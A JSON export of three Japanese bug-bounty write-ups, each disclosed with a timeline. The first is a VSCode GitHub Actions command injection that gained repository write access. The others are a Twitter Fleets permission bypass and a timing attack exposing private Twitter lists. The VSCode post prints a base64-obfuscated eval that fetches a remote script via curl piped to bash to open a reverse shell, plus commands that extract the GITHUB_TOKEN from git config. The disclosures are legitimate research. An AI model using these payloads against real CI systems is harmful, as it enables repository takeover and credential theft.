[{"content":"はじめに Microsoftは脆弱性の診断行為をセーフハーバーにより許可しています。\n本記事は、そのセーフハーバーを遵守した上で発見/報告した脆弱性を解説したものであり、無許可の脆弱性診断行為を推奨する事を意図したものではありません。\nMicrosoftが運営/提供するサービスに脆弱性を発見した場合は、Microsoft Bug Bounty Programへ報告してください。\n要約 VSCodeのIssue管理機能に脆弱性が存在し、不適切な正規表現、認証の欠如、コマンドインジェクションを組み合わせることによりVSCodeのGitHubリポジトリに対する不正な書き込みが可能だった。\n発見のきっかけ 電車に乗っている際にふと思い立ってmicrosoft/vscodeを眺めていた所、CI用のスクリプトが別のリポジトリ(microsoft/vscode-github-triage-actions)にまとめられていることに気がついた。\n非常に暇だったのでそのスクリプトを眺めていた際に、以下のようなコードを発見した1:\nexec(`git -C ./repo merge-base --is-ancestor ${commit} ${release}`, (err) =\u0026gt; { [...] }),  commit変数またはrelease変数に任意の入力ができれば、コマンドインジェクションができるな、と思い追加で調査することにした。\nコードを読む 電車の中でPCを広げるわけにもいかないため、スマホでGitHubの検索機能を用いてコードを読むことにした。\n上記のコマンドインジェクションができそうな処理を含む関数の名前がreleaseContainsCommitだったため、そのまま検索すると5件の検索結果が帰ってきた。\nその内1件がテスト用のコード2、2件が上記の関数の定義3、2件がこの関数を使用しているコード4だった。\nこれらのコードの流れを軽く追ってみると、特定の条件5を満たすIssue内でそのIssueをクローズする要因となったコミットハッシュをgetClosingInfo関数より取得し、releaseContainsCommitへ渡していた。6(上記のcommit変数)\n不適切な正規表現 getClosingInfo関数では、Issueをクローズする際にコミットを関連付けし忘れた場合でも問題なくIssueの管理を続けられるように、\\closedWithというコマンドを用意していた7。\nこのコマンドは、\\closedWith コミットハッシュといったような形式のコメントをIssueに対して追加することにより、特定のコミットハッシュをIssueと関連付けることができるのだが、このコマンドをコメント内から検索する正規表現8に問題があった。\n/(?:\\\\|\\/)closedWith (\\S*)/  この正規表現は、\\closedWith または/closedWith で始まり、その後ホワイトスペースが出てくるまでの文字列にマッチする。\nここでは、\\closedWith コミットハッシュというコマンドにのみマッチすればよかったため、\\Sの部分を[a-fA-F0-9]にするべきだった。\nまた、この正規表現は文頭に\\closedWith がある必要がないため、Issueのコメントのどこかに\\closedWith という文字列を含められればコマンドとして認識されてしまう。\nそのため、\u0026lt;!-- \\closedWith コミットハッシュ --\u0026gt;といったようなコメントをされた際に、コマンドを実行されたと認識できずにコマンドが実行されてしまう恐れがあった。\n認証の欠如 また、この関数内では本来行われるべき権限の確認が行われていなかった。\nmicrosoft/vscodeリポジトリ内では、以下のような形で\\closedWithコマンドを実行できるユーザーを絞っていた9が、この認証の欠如により権限を持たないユーザーがコミットの関連付けを行える状態となってしまっていた。\n{ \u0026quot;type\u0026quot;: \u0026quot;comment\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;closedWith\u0026quot;, \u0026quot;allowUsers\u0026quot;: [ \u0026quot;cleidigh\u0026quot;, \u0026quot;usernamehw\u0026quot;, \u0026quot;gjsjohnmurray\u0026quot;, \u0026quot;IllusionMH\u0026quot; ], \u0026quot;action\u0026quot;: \u0026quot;close\u0026quot;, \u0026quot;addLabel\u0026quot;: \u0026quot;unreleased\u0026quot; },  脆弱性を突けるか これらの脆弱性を用いることにより、\\closedWithコマンドの引数にある程度任意の内容が渡せ、その入力をコマンドインジェクションが存在する箇所へと渡せることがわかった。\nつまり、特定の条件5を満たすIssueに対して\\closedWith `ここにコマンド` といったようなコメントを行えばGitHub Actions内で任意のコマンドを実行できるのだが、Issueが以下の検索クエリのどちらかに引っかかる必要があり、ラベル付けを行う権限が無い一般ユーザーが能動的に脆弱性を突くのは厳しい可能性があった。\n`is:closed label:${this.notYetReleasedLabel}`  `is:closed label:${this.pendingReleaseLabel} label:${this.authorVerificationRequestedLabel}`  また、脆弱性が存在するauthor-verifiedスクリプト及びrelease-pipelineスクリプトを使用しているワークフローは3つ10あったが、そのうち2つは特定のラベルがIssueについている状態でそのIssueがクローズされた際や、Issueにラベル付けされた際などに発火するもので、能動的な悪用が困難な状態だった。\nしかしながら、最後の一つ11はscheduleでワークフローを発火させており、毎日14時20分(UTC)になると以下のクエリに合致するIssueに対して上記の関連コミット検索が行われるように設定されていた。\nis:closed label:awaiting-insiders-release label:author-verification-requested  この条件に合致するIssueを検索した所、脆弱性の調査時点で一件のIssue12が該当することがわかった。\nこのIssueを用いることにより、脆弱性を突けることがわかったため、実際に突いてみることにした。\n脆弱性を突く 前述の通り、\\closedWith `コマンド` のようなコメントを書き込むことにより脆弱性を突くことが出来る。\nしかしながら、対象のIssueは公開されている状態であり、そのまま書き込んでしまうと他のユーザーに脆弱性の概要を把握され、悪用されてしまう可能性があった。\nそのため、文中のどこかに\\closedWithが含まれていればいいという挙動を利用し、普通のコメントに偽装して脆弱性を突くことにした。\nDoes the next version fix this issue? \u0026lt;!-- \\closedWith `ここにコマンド` --\u0026gt;  また、このタスクが実行されるのが14時20分(UTC)であり、JSTに直すと23時20分であるため、とても眠い中作業をすることになる可能性があった。\nそのため、眠気による事故が起きないよう予め脆弱性を突いた後の動きをある程度決めてから行うことにした。（実際めっちゃ眠かった)\n影響の特定 予め動きを決めておくためには、この脆弱性を突くことにより発生し得る影響を特定しなければならない。\n幸いにも、CI内で使用されているスクリプト郡は全てGitHub上でホストされているため、実際に脆弱性を突く前にある程度正確な影響を把握することができた。\nまず大前提として、GitHub Actionsはpull_requestイベント以外ではsecrets.GITHUB_TOKENにリポジトリに対する書き込み権限を持ったGitHub Access Tokenをセットする13。\n次に、actions/checkoutはデフォルトでディスク上にsecrets.GITHUB_TOKENを残す14。\n最後に、actions/checkoutを実行した後のステップではディスク上にsecrets.GITHUB_TOKENが残っている。\nこれにより、actions/checkoutを実行した後のステップで任意のコードを実行できた場合、発火元のイベントがpull_requestでなければGitHub Actionsを実行しているリポジトリに対して書き込み権限を得ることが出来る。\n計画 ここまでの考えに至った後、実際に作業状態になったのが大体18時頃だったため、ご飯を食べてお風呂に入る時間を除くと約4時間ほどで計画を練る必要があった。\n作業を行う準備を終えた後、まず初めに、Issueのコメントで使用するPayloadを考えた。\nGitHubのMarkdownのパース仕様上、コメントアウトの中では--が使えず、また正規表現によりホワイトスペースが使用できないため、最終的なPayloadは以下のようになった。(冗長な所があると思うが、時間がなかったので許してほしい)\nDoes the next version fix this issue? \u0026lt;!-- \\closedWith `eval${IFS}$(echo${IFS}'Y3VybCAiaHR0cHM6Ly9yeTB0YWsuZ2l0aHViLmlvL3BheWxvYWRzL2Q1MGNmMWRmYjJlNzQ5Y2RhYTQ2ZjBiOGQ1ZGEzMzFkLnNoIiB8IGJhc2g='|base64${IFS}-d)` --\u0026gt;  このPayloadでは、curl https://ry0tak.github.io/payloads/d50cf1dfb2e749cdaa46f0b8d5da331d.sh | bashをBase64エンコードした物をデコードし、それをコマンドとして実行している。\n現在は削除されているが、このリンク先のスクリプトはリバースシェルを張るものだったため、このコマンドが実行された時点で任意の操作をGitHub Actions上で行えるようになっていた。\n次に、リバースシェルを張った後に実行するコマンドを考えた。\nactions/checkoutは、ローカルのGitリポジトリに対して適切に認証を行うための設定を自動で行う。\nそのため、そのリポジトリを利用して無害なファイルをプッシュするのが最も簡単で良いという結論に至り、以下のようなコマンドを実行することにした。\ncd repo git config --global user.name \u0026quot;Ry0taK\u0026quot; git config --global user.email \u0026quot;49341894+Ry0taK@users.noreply.github.com\u0026quot; echo -e \u0026quot;This is a PoC for my MSRC report. (No malicious intent here! This is not a phishing!)\\nIt would be appreciated if you don't delete the commit history until the MSRC team reviewed my report. (This is 'Reliable \u0026amp; minimized proof-of-concept' defined here: https://www.microsoft.com/en-us/msrc/bounty-example-report-submission)\\nIf you are a maintainer, please send me a message at Twitter (@ryotkak) with a proof of maintainer for quick fix.\u0026quot; \u0026gt; ryotak.txt git add ryotak.txt git commit -m \u0026quot;Add MSRC PoC\u0026quot; git push  最後に、脆弱性を突いた後すぐにMicrosoftへ報告できるように、予め脆弱性が突けたと仮定したレポートを作成し、コピペすればレポートが送信できる状態にしておいた。\n実行 23時20分(JST)に処理が走るため、23時15分ごろにコメントを追加した。15\nその後、23時41分になってワークフローが実行され16、リバースシェルが張られた。\nしかしながら、上記の手順でコマンドを実行した際に、masterブランチにブランチ保護がかかっているというエラーが出てしまった。\nそのため、慌てて以下のコマンドを実行しryotakブランチを新規に作成、プッシュした: https://github.com/microsoft/vscode/commit/2dadb25aeb01922fcc321ebba95bd0a95d12ec0a\ngit checkout -b ryotak git push -u origin ryotak  その後、ブランチ保護を回避する方法を探すために、以下のコマンドを実行してGitHub Access Tokenを抽出した。\nauth_conf=$(git config --get http.https://github.com/.extraheader)\tencoded=$(echo $auth_conf | sed s/\u0026quot;AUTHORIZATION: basic \u0026quot;//)\tdecoded=$(echo $encoded | base64 -d | sed s/\u0026quot;x-access-token:\u0026quot;// | tr -d '\\n') echo $decoded  このトークンを用いて、ブランチ保護を確認した所、masterブランチにはアカウントベースのマージ保護があり、ブランチ保護の回避は困難であることがわかった。\n他の重要そうなブランチを調査した結果、リリースブランチに対してはアカウントベースのマージ保護が存在せず、書き込みアクセスを持つユーザー1名以上のApproveがあればプルリクエストをマージできることが判明した。\nGitHub Actionsに付与されるトークンはgithub-actionsというBotユーザーのものであるため、プルリクエストのApproveを行うことができる。 これを用いることにより、リリースブランチに対して任意のコミットが出来ることを証明することができた: https://github.com/microsoft/vscode/pull/113596 まとめ 今回の記事は、CIのスクリプト内に存在した脆弱性を紹介しました。\nCIのスクリプトは、普段OSSの監査を行う際等にあまり気にしない箇所であったため、かなり印象的でした。\nまた、今回の脆弱性報告のプロセス中、Microsoft側の応答が非常に丁寧かつ迅速でとても好印象でした。\n実際には行いませんでしたが、リポジトリに対する書き込み権限があったため、新規バージョンのリリース等も実行できたのではないかな、と思っています。\n本記事に関する質問はTwitter(@ryotkak)へメッセージを投げてください。\nタイムライン    日付 出来事     2020/12/29 13時頃 コマンドインジェクションを発見   2020/12/29 14時頃 脆弱性が突けそうであることを確認   2020/12/29 18時頃 帰宅した後、準備を開始   2020/12/29 21時頃 諸々の準備を完了   2020/12/29 23:15 PayloadをIssueに書き込み   2020/12/29 23:41 GitHub Actions内からリバースシェルが張られる   2020/12/29 23:41 masterへプッシュできないことを確認   2020/12/29 23:45頃 GitHub Actionsのトークンを入手   2020/12/29 23:50頃 ブランチ保護に関する調査完了   2020/12/29 24時頃 脆弱性の影響範囲の特定   2020/12/29 24時頃 脆弱性の報告   2021/01/01 脆弱性の一時対応が完了   2021/01/05 脆弱性の修正が完了   2021/01/12 脆弱性の開示許可を求める   2021/01/12 脆弱性の開示許可が出る   2021/01/12 脆弱性の開示      https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L161 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/testbed.ts#L68-L70 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/db8d13b11082eb0d14a2b4fb5bc19d30f2531b4d/api/octokit.ts#L158\nhttps://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/api/api.ts#L21 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/release-pipeline/ReleasePipeline.ts#L49-L54\nhttps://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/author-verified/AuthorVerified.ts#L81-L84 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/author-verified/AuthorVerified.ts#L20\nhttps://github.com/microsoft/vscode-github-triage-actions/blob/0c3e4907d6516778ea95d7bb657b8eb5c44ac49d/release-pipeline/ReleasePipeline.ts#L21 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/author-verified/AuthorVerified.ts#L71-L84 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L402-L411 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode-github-triage-actions/blob/cd7ec725801fe3107cc33cf9a1446f36441cee8b/api/octokit.ts#L374 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/commands.json#L143-L154 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/release-pipeline-labeler.yml\nhttps://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/on-label.yml\nhttps://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/author-verified.yml \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/blob/c7fa31fc926a006865462fa9bba5760364434bcc/.github/workflows/author-verified.yml \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/issues/113374 \u0026#x21a9;\u0026#xfe0e;\n https://docs.github.com/en/free-pro-team@latest/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token \u0026#x21a9;\u0026#xfe0e;\n https://github.com/actions/checkout/blob/61b9e3751b92087fd0b06925ba6dd6314e06f089/action.yml#L48-L50 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/issues/113374#issuecomment-752092722 \u0026#x21a9;\u0026#xfe0e;\n https://github.com/microsoft/vscode/actions/runs/450927894 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-01-12","permalink":"https://blog.ryotak.me/post/vscode-write-access/","tags":["Bug Bounty","脆弱性","Microsoft","VSCode","RCE"],"title":"VSCodeのGitHubリポジトリに対する不正なPushアクセス"},{"content":"はじめに TwitterはBug Bountyプログラム(脆弱性報奨金制度とも呼ばれる)を実施しており、脆弱性の診断行為を行うことが認められています。\n本記事は、そのプログラムを通して報告された脆弱性についてを解説したものであり、Twitterが認知していない未修正の脆弱性を公開する事を意図したものではありません。\nまた、Twitter上で脆弱性を発見した場合はTwitterのBug Bountyプログラムより報告してください。\n(This article is written in Japanese. If you\u0026rsquo;d like to read this article in English, please visit HackerOne report.)\nTL;DR Twitterが公開したフリート機能が使用しているAPIに脆弱性が存在し、READ権限しか持っていないサードパーティアプリケーションがフリートの作成や削除などを行えた。\n調査したきっかけ Twitterは2020年11月10日に、フリートと呼ばれる機能を日本に対して公開した。\n当初はiOS版のクライアントのみに実装されたが、翌日の11日には手元のAndroid端末にフリート機能用の更新が降ってきていたため、APIを解析してみることにした。\n解析 Twitter for Androidは通常のAndroidアプリと同じくJavaで書かれており、難読化はされているものの解析はそこまで難しくない。\nそのため、apktoolとdex2jar、CFRを用いてデコンパイルし、ある程度可読性が高い状態に戻した。(詳細なデコンパイル方法に関してはここでは触れないが、ググれば出てくるのでそちらを参照してほしい。)\nエンドポイント名がわからなければAPIを解析できないため、grepを用いてfleetという文字列が含まれる.javaファイルを検索し、/fleet/v1/user_fleetsという文字列が含まれるファイルを発見した。\nそのファイルと同じ階層にあるファイルを調べた所、他のエンドポイントと思わしき文字列が見つかったため、一旦それらを解析し、Gistにまとめた。\n検証中に\u0026hellip; その後、Gistの内容を精査している際に、サードパーティのアプリケーションとして認証している際にフリート関連のAPIを叩くと、問題なく動作することがわかった。\nこの事をドキュメントにまとめて公開すれば非公式クライアントの製作者の方が喜ぶのでは？と思い詳細なAPIドキュメントを書いた。\n公開する前にこのGistの内容が間違っていないか検証していた所、POST /fleets/v1/createに対して読み取り権限しか持たないアプリケーションとしてリクエストを送信した際に、フリートが作成されてしまっていることがわかった。\nこれは脆弱性なのか？ 最初は検証用アプリケーションに誤って書き込み権限を与えてしまったのだと思い、権限を確認したが、明らかに読み取り権限しか与えられていなかった。\nこの時点で、これは脆弱性なのでは？と思い始めたが、確証が得られなかったのでもう少し深く調査することにした。\nその結果、通常のTwitterのAPI(POST /1.1/statuses/update.json等)では、APIの処理が走る前に権限チェックをしていたが(当たり前だが)、どうやらフリート関連のエンドポイントは通常のAPIでは行われる権限チェックが行われていないことが判明した。\n$ twurl /1.1/statuses/update.json --header 'Content-Type: application/json' -d '{\u0026quot;status\u0026quot;:\u0026quot;Test\u0026quot;}' {\u0026quot;request\u0026quot;:\u0026quot;\\/1.1\\/statuses\\/update.json\u0026quot;,\u0026quot;error\u0026quot;:\u0026quot;Read-only application cannot POST.\u0026quot;} $ twurl /fleets/v1/create -X POST --header 'Content-Type: application/json' -d '{\u0026quot;text\u0026quot;:\u0026quot;Hey yo\u0026quot;}' {\u0026quot;fleet\u0026quot;:{\u0026quot;created_at\u0026quot;:\u0026quot;2020-11-12T12:29:16.180000000Z\u0026quot;,\u0026quot;deleted_at\u0026quot;:null,\u0026quot;expiration\u0026quot;:\u0026quot;2020-11-13T12:29:16.189235445Z\u0026quot;,\u0026quot;fleet_id\u0026quot;:\u0026quot;F1-328253875041691174\u0026quot;,\u0026quot;fleet_thread_id\u0026quot;:\u0026quot;T1-328253875041625638\u0026quot;,\u0026quot;mentions\u0026quot;:null,\u0026quot;mentions_str\u0026quot;:null,\u0026quot;read\u0026quot;:false,\u0026quot;text\u0026quot;:\u0026quot;Hey yo\u0026quot;,\u0026quot;user_id\u0026quot;:1195137762027962368},\u0026quot;fleet_thread_id\u0026quot;:\u0026quot;T1-328253875041625638\u0026quot;,\u0026quot;fleet_id\u0026quot;:\u0026quot;F1-328253875041691174\u0026quot;,\u0026quot;users\u0026quot;:null}  報告 脆弱性であることがわかったため、一旦フリート関連のAPIドキュメントの公開を見送り、Twitterに報告することにした。\n報告は11月12日に行ったのだが、11月18日(実際にはもう数日前だったのだと思う)には修正されており、非常に印象的な修正速度だった。\nしかしながら、残念なことにフリート関連のAPIがサードパーティのアプリケーションによって使用できていた事自体が問題だったようで、フリート関連のAPIをサードパーティのアプリケーションに叩かせないように変更することで修正されてしまった。\nその後 Twitterが脆弱性を修正した3日後、同じくフリートのAPIを解析してフリートの画像が24時間経った後もCDNから削除されない事をツイートしている人がおり、フリート機能の実装に使えた期間はとても短かったのかな、と少しTwitter内部の開発者がかわいそうになってしまった。\ni have also just confirmed that the media URLs don't expire after 24h, so you can view fleets after they're deleted\n— 波兰蠢驴 (@donk_enby) November 21, 2020  この脆弱性を発見する理由となったGistに関しては、[ここで公開](https://gist.github.com/Ry0taK/005b79eccb4297469a09696dae9fa3c6)しているので何かの役にたててほしい。 まとめ この一連の流れで、新機能を解析することの重要さと、どんな大企業でもミスはするという教訓を得ることが出来た。\nTwitterに報告した際の実際のレポートはここから見れるので是非読んでみてほしい。\nこのブログ記事に関して、なにか質問等がある場合はTwitter(@ryotkak)へDMを飛ばしてください。\nタイムライン    日付 出来事     2020/11/10 Twitterがフリート機能を日本向けにリリース   2020/11/11 手元の環境でフリート機能が使えるようになった   2020/11/12 脆弱性を発見、報告   2020/11/13 Twitter: 現在確認中   2020/11/14 Twitter: 脆弱性として認定   2020/11/18 Twitter: 脆弱性を修正   2020/12/15 Twitter: 報奨金額の決定   2021/01/05 脆弱性の開示    ","date":"2021-01-05","permalink":"https://blog.ryotak.me/post/twitter-privesc/","tags":["Twitter","脆弱性","Fleet","Privilege Escalation","Bug Bounty"],"title":"Twitterのフリート機能に対する権限昇格"},{"content":"はじめに TwitterはBug Bountyプログラム(脆弱性報奨金制度とも呼ばれる)を実施しており、脆弱性診断を行うことが認められています。\n本記事は、そのプログラムを通して報告された脆弱性についてを解説したものであり、インターネット上のサービスに無差別に攻撃する事を推奨するものではありません。\nまた、Twitter上で脆弱性を発見した場合は無闇に公開せず、TwitterのBug Bountyプログラムより報告してください。\n要約 不適切なアクセス制御とレートリミットの欠如、タイミング攻撃を組み合わせることによりTwitterの非公開リストの中身を閲覧できた。\n不適切なアクセス制御 TwitterのGraphQLエンドポイントに対して以下のようなリクエストを送信すると、リストが非公開であったとしてもリストのメンバーリストを取得することが出来た。\nGET /graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers?variables=%7B%22listId%22%3A%22[ここにリストID]%22%2C%22count%22%3A20%2C%22withTweetResult%22%3Afalse%2C%22withUserResult%22%3Afalse%7D HTTP/1.1 Host: api.twitter.com User-Agent: [Redacted] Accept: */* Accept-Language: ja,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate content-type: application/json x-twitter-auth-type: OAuth2Session x-twitter-client-language: ja x-twitter-active-user: yes x-csrf-token: [Redacted] Origin: https://twitter.com authorization: Bearer [Redacted] Connection: close Cookie: [Redacted]  リストのIDが取得できれば非公開リストの内容が読み取れる状態だったので報告したが、Twitter曰く非公開リストのIDを取得するのは困難らしく、それを回避しない限り潜在的な脆弱性でしか無いと拒否されそうになった。1\nしかしながら、TwitterのIDはミリ秒単位のタイムスタンプ、Worker ID、データセンターID、ID衝突回避用の値で構成されており、そのうちID衝突回避用の値は0始まりで衝突するたびに加算されていく物で、かつデータセンターIDは基本的に10であるため、ミリ秒単位のタイムスタンプとWorker IDを推測することができれば実質的にIDがわかる。\n攻撃は現実的であるということを証明する必要があったため、更に調査することにした。\nレートリミットの欠如 非公開リストのIDを取得する方法を探していた際に、Twitter APIの一部のレートリミットが、ドキュメント上には存在すると書いてあるにも関わらず、実際には存在しないことがわかった。\nそれらのエンドポイントの一つにPOST /1.1/lists/destroy.jsonが存在した。\nこのエンドポイントは、リストを削除するためのエンドポイントなのだが、当然他人の非公開リストを削除しようとしたとしても404が帰ってくるだけだった。\nPOST /1.1/lists/destroy.json Content-Type: application/x-www-form-urlencoded Authorization: OAuth [Redacted] list_id=[ここにリストID]  タイミング攻撃 前述のエンドポイントを詳しく調べている際に、TwitterのAPIにリクエストを送った際に帰ってくるレスポンスのほぼ全てにx-response-timeというヘッダが存在していることがわかった。\n確認した所、このヘッダはTwitter API内部で処理にかかった時間を正確に返しているようだった。\nここまで露骨な前振りをされたらタイミング攻撃しか無いだろうということで試してみた所、他人の非公開リストの削除を試みた場合と存在しないリストの削除を試みた場合とでx-response-timeの値に～20程の差異が存在した。\nこれと前述のレートリミットの欠如を組み合わせることにより、非公開リストのIDを現実的な時間内で総当りすることが可能となり、それを報告した所無事にTwitterのセキュリティチームによりトリアージされた。\nまとめ Twitterのトリアージチームがこの脆弱性を調査している間、非公開リストのメンバーリストを取得できるのは「Bug Bountyプログラムで扱うほどのリスクではない」という返信が帰ってくるなど、拒否されそうになる場面が何度かあったが、根気良く説明した事により脆弱性として認められた。\n一度拒否することが確定した物2でも、セキュリティ上の問題が明確なものに関してはなぜ問題なのかを説明することが重要で、それによって一転して脆弱性であると認めることがあるため、今後Twitterに脆弱性を報告する人はその点を留意したほうが良いかもしれない。\nタイムライン    日付 出来事     2020/5/29 脆弱性を報告   2020/5/30 Twitter: 更に情報が必要   2020/5/30 追加の情報を送信   2020/6/1 Twitter: 更に情報が必要   2020/6/2 追加の情報を送信   2020/6/2 Twitter: 内部調査中   2020/6/6 Twitter: 脆弱性として認定   2020/6/24 Twitter: 報奨金額の決定   2020/8/1 Twitter: 脆弱性を修正   2020/8/4 脆弱性の開示      後のレポートでIDを取得することは容易であるとTwitterチームが認めたが、直近のレポートでもトリアージチームはIDを取得する方法が無いという理由で拒否しようとしてくる。 \u0026#x21a9;\u0026#xfe0e;\n 例として、限定公開のコンテンツのURLが推測出来るということを報告したらそれは脆弱性ではなく仕様であるとされたことや、非公開ツイートの一部データが取得できる事を報告したらそれはBug Bountyプログラムで扱うほどのリスクではないとされたこと等がある。 \u0026#x21a9;\u0026#xfe0e;\n   ","date":"2020-10-09","permalink":"https://blog.ryotak.me/post/twitter-list-chain/","tags":["Twitter","脆弱性","IDOR","Brute Force","Timing Attack","Bug Bounty"],"title":"Twitterの非公開リストが見れた話"}]